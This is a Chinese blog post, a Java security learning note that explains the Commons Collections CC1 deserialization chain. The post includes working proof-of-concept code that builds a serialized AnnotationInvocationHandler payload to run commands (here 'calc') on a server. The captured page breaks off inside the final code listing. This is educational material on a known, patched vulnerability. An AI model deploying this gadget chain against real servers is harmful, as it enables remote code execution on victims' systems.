@@ -1,0 +1,817 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rightevil">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CC1链，即CommonCollections利用链。 我们首先来了解一下这个链中命令执行的核心逻辑，然后再了解怎么反序列化触发。 命令执行的核心逻辑注意，在使用下面的demo的时候，需要在pom.xml中指定Commoncollections的版本。CC链在 3.2.2 版本被修复了，所以我们必须用 3.1 或 3.2.1 版本做实验 12345678&lt;dependencies&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全学习笔记5-CC1链">
+<meta property="og:url" content="https://rightevil.github.io/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-CC1%E9%93%BE/index.html">
+<meta property="og:site_name" content="rightevil">
+<meta property="og:description" content="CC1链，即CommonCollections利用链。 我们首先来了解一下这个链中命令执行的核心逻辑，然后再了解怎么反序列化触发。 命令执行的核心逻辑注意，在使用下面的demo的时候，需要在pom.xml中指定Commoncollections的版本。CC链在 3.2.2 版本被修复了，所以我们必须用 3.1 或 3.2.1 版本做实验 12345678&lt;dependencies&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://origin.picgo.net/2026/03/18/1769758150473-b2a9829f-4370-4f32-98ce-4fe96fdfd88ca2f74554ca3e0a78.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/03/18/1772704955902-f48edd2f-17d9-4af0-9def-695c6c418655414d1e151d86ec9d.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/03/18/1773815643209-341c4536-d0e4-4390-b0f6-f8f42b56318863778448dac0c191.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/03/18/1773816308728-c8987224-a027-416d-a651-f0209c81b10b22837b3c1ca25ece.png">
+<meta property="article:published_time" content="2026-01-29T09:15:02.000Z">
+<meta property="article:modified_time" content="2026-03-18T07:09:16.024Z">
+<meta property="article:author" content="rightevil">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://origin.picgo.net/2026/03/18/1769758150473-b2a9829f-4370-4f32-98ce-4fe96fdfd88ca2f74554ca3e0a78.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java安全学习笔记5-CC1链 - rightevil</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rightevil.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-285611083-1","gtag":"G-TKYW22HREX","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-285611083-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.googletagmanager.com/gtag/js?id=G-TKYW22HREX', function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-TKYW22HREX');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v12.0"></script>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>嘿阔乐园</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                好友blog
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java安全学习笔记5-CC1链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-29 17:15" pubdate>
+          2026年1月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          111 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java安全学习笔记5-CC1链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>CC1链，即CommonCollections利用链。</p>
+<p>我们首先来了解一下这个链中命令执行的核心逻辑，然后再了解怎么反序列化触发。</p>
+<h1 id="命令执行的核心逻辑"><a href="#命令执行的核心逻辑" class="headerlink" title="命令执行的核心逻辑"></a>命令执行的核心逻辑</h1><p>注意，在使用下面的demo的时候，需要在pom.xml中指定Commoncollections的版本。<em>CC链在 3.2.2 版本被修复了，所以我们必须用 3.1 或 3.2.1 版本做实验</em></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;dependencies&gt;<br>    <br>    &lt;dependency&gt;<br>        &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>        &lt;version&gt;3.1&lt;/version&gt;<br>    &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在这里我们需要搞懂Transformers（变换器）是怎么一棒接一棒的传递数据，然后执行命令的。这里我们用到p神的demo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.map.TransformedMap;<br><br>import java.util.HashMap;<br>import java.util.Map;<br><br>public class CC1Demo &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        // 1. 构造 Transformer 数组（攻击流水线）<br>        Transformer[] transformers = new Transformer[]&#123;<br>            // 第1步：不管输入什么，都返回 Runtime.getRuntime() 这个对象<br>            // (注意：这里直接用了 Runtime 对象，这是为了演示方便，实际上 Runtime 不能序列化，后面会改)<br>            new ConstantTransformer(Runtime.getRuntime()),<br>            <br>            // 第2步：接收上面的 Runtime 对象，调用它的 exec 方法<br>            // 参数是 &quot;calc&quot; (Windows) 或 PDF 里的计算器路径 (Mac)<br>            new InvokerTransformer(&quot;exec&quot;, <br>                new Class[]&#123;String.class&#125;, <br>                new Object[]&#123;&quot;calc&quot;&#125;) <br>        &#125;;<br><br>        // 2. 把数组封装成一条链<br>        Transformer transformerChain = new ChainedTransformer(transformers);<br><br>        // 3. 准备一个普通的 Map<br>        Map innerMap = new HashMap();<br>        innerMap.put(&quot;value&quot;, &quot;value&quot;);<br><br>        // 4. 【关键】使用 TransformedMap 包装这个 Map<br>        // 它的作用是：每当 Map 里有新元素添加/修改时，自动调用 transformerChain 进行处理<br>        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);<br><br>        // 5. 触发漏洞！<br>        // 向 Map 中 put 一个新值，触发了 TransformedMap 的回调机制<br>        // 回调机制执行了 transformerChain -&gt; 执行了 exec -&gt; 弹出计算器<br>        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这是我让Gemini给p神的demo注释了一下，然后我们来看这里面的具体组件。</p>
+<ol>
+<li>TransformedMap：这个类对Java里的正常Map结构做一个修饰。当修饰后的Map在添加新元素的时候，会执行一个回调，这里的回调不是一个回调函数，而是一个实现了Transformer接口的类。这里的key和value分别是处理新元素的key和value时执行的回调。</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Transformer：这个接口里定义了一个transform方法，就是上面TransformedMap里执行的回调，就是执行这个接口的transform方法</li>
+<li>ConstantTransformer：他的作用就是包装一个对象，然后在执行回调的时候返回这个对象</li>
+<li>InvokerTransformer：这个就是执行命令的扳机，用来执行输入进去的一个类的指定的方法。</li>
+<li>ChainedTransformer：用来装一个Transformer数组，把上一个Transformer的输出放到下一个的输入，就像Linux的管道符一样，把前一个的输出给后一个当输入</li>
+</ol>
+<p>那到了这里，我们也有了一个大概的想法，就是</p>
+<p>先创建一个Transformer数组，里面一个ConstTransformer，里面放可以用来执行命令的类的对象，然后一个InvokeTransformer里填写这个对象执行命令的具体方法，以及命令的参数。</p>
+<p><code>Transformer[]=[ConstantTransformer(), InvokerTransformer()]</code></p>
+<p>然后用ChainedTransformer连接起来</p>
+<p><code>ChainedTransformer(Transformer[])</code></p>
+<p>TransformedMap装饰一个Map结构，然后里面的回调填<code>ChainedTransformer</code>,后面往Map中加数据，就会自动执行了，这也是Demo中的流程。</p>
+<p><img src="https://origin.picgo.net/2026/03/18/1769758150473-b2a9829f-4370-4f32-98ce-4fe96fdfd88ca2f74554ca3e0a78.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h1><p>上半部分我们学到了cc1链的原理逻辑并且在本地上执行了，那我们现在就要想办法让远程服务器也能执行。我们需要这么一个类，他：</p>
+<ul>
+<li>实现了Serializable，可以被序列化</li>
+<li>重写了readObject方法，服务器收到数据可以自动执行</li>
+<li>他的readObject方法里调用了Map的setValue或者put方法</li>
+</ul>
+<p>这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code> ,这个类原本是用来处理Java注解（@Override）这种的。</p>
+<p>他的readObject方法如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">private void readObject(ObjectInputStream s) &#123;<br>    s.defaultReadObject();<br>    // memberValues 就是我们传进去的那个被 Transformer 修饰过的 Map<br>    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        String name = memberValue.getKey();<br>        // ... 一系列复杂的判断 ...<br>        // 【触发点】这里调用了 setValue！<br>        // 一旦 setValue 执行，TransformedMap 就会拦截，启动 Transformer 链，弹出计算器<br>        memberValue.setValue(...); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>写poc之前还需要解决3个问题</p>
+<p><strong>1.解决Runtime不可序列化的问题</strong></p>
+<p>在上个篇章中的demo里我们直接用ConstantTransformer产出的Runtime类，但是Runtime类没有Serializable接口，没办法序列化。我们虽然没办法传Runtime对象，但是我们可以传Runtime对象的反射代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-comment">// 1. 传入 Runtime.class (Class对象是可以序列化的)</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <br>    <span class="hljs-comment">// 2. 反射调用 getMethod(&quot;getRuntime&quot;)</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <br>    <span class="hljs-comment">// 3. 反射调用 invoke(null) -&gt; 得到 Runtime 实例</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <br>    <span class="hljs-comment">// 4. 反射调用 exec(&quot;calc&quot;)</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p><strong>2.满足AnnotationInvocationHandler的触发条件</strong></p>
+<p>AnnotationInvocationHandler调用setValue时需要满足2个if判断</p>
+<p><img src="https://origin.picgo.net/2026/03/18/1772704955902-f48edd2f-17d9-4af0-9def-695c6c418655414d1e151d86ec9d.png" srcset="/img/loading.gif" lazyload></p>
+<p>判断条件就是：它会检查Map里的key，是否在指定的注解类中存在对应的属性名。为此，我们的构造函数第一个参数传Retention.class（一个Java标准注解），在Retention注释里有一个属性叫value，构造函数的第二个参数传Map，Map的key必须是value。此时就对上了（Key 名字==注解属性名）。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Map 的 Key 必须叫 &quot;value&quot;</span><br>innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>3.利用反射实例化内鬼</strong></p>
+<p>AnnotationInvocationHandler是一个sun包下的私有类，没办法new出来，要用反射强行获取构造函数，然后实例化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 获取类</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-comment">// 2. 获取构造函数 (参数：注解类, Map)</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br><span class="hljs-comment">// 3. 暴力破解权限</span><br>c.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 4. 实例化 (传入 Retention.class 和我们精心制作的 map)</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> c.newInstance(java.lang.annotation.Retention.class, outerMap);<br></code></pre></td></tr></table></figure>
+
+<p>最后的这个payload就是我们构造的对象，把他序列化发给服务器，服务器就会执行</p>
+<p>流程如下：</p>
+<ul>
+<li><strong>准备子弹</strong>：制作一个能执行 Runtime.exec 的 Transformer 链（利用反射绕过序列化限制）。</li>
+<li><strong>准备陷阱</strong>：用 TransformedMap 包装一个普通的 Map，并把子弹装进去。</li>
+<li><strong>设置诱饵</strong>：Map 的 Key 必须设为 “value”，以满足触发条件。</li>
+<li><strong>伪装发货</strong>：用反射实例化 AnnotationInvocationHandler，把那个 Map 塞给它。</li>
+<li><strong>发送</strong>：序列化这个 Handler 对象发送给受害者。</li>
+<li><strong>爆炸</strong>：受害者执行 readObject -&gt; 遍历 Map -&gt; 匹配到 “value” -&gt; 执行 setValue -&gt; 触发 Transformer 链 -&gt; <strong>RCE</strong>。</li>
+</ul>
+<p>但是复现这个流程，必须使用JDK7或者JDK 8u71之前的版本，因为JDK 8u71之后，AnnotationInvocationHandler的代码改了，删了setValue的逻辑。整体poc如下，抄的p神的，然后用Gemini生成了注释</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonCollections1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// =============================================================</span><br>        <span class="hljs-comment">// 第一步：构造恶意调用链 (The Payload)</span><br>        <span class="hljs-comment">// 目标：执行 Runtime.getRuntime().exec(&quot;calc&quot;)</span><br>        <span class="hljs-comment">// 难点：Runtime 对象不可序列化，所以必须用反射的方式去获取并调用</span><br>        <span class="hljs-comment">// =============================================================</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">// 1. 无论输入什么，都返回 Runtime.class (这是个 Class 对象，可序列化)</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br><br>                <span class="hljs-comment">// 2. 反射调用 getMethod(&quot;getRuntime&quot;)，得到 Method 对象</span><br>                <span class="hljs-comment">// 相当于：Runtime.class.getMethod(&quot;getRuntime&quot;)</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br><br>                <span class="hljs-comment">// 3. 反射调用 invoke(null)，得到 Runtime 实例</span><br>                <span class="hljs-comment">// 相当于：method.invoke(null) -&gt; 也就是 Runtime.getRuntime()</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br><br>                <span class="hljs-comment">// 4. 反射调用 exec(&quot;calc&quot;)</span><br>                <span class="hljs-comment">// 相当于：runtime.exec(&quot;calc&quot;)</span><br>                <span 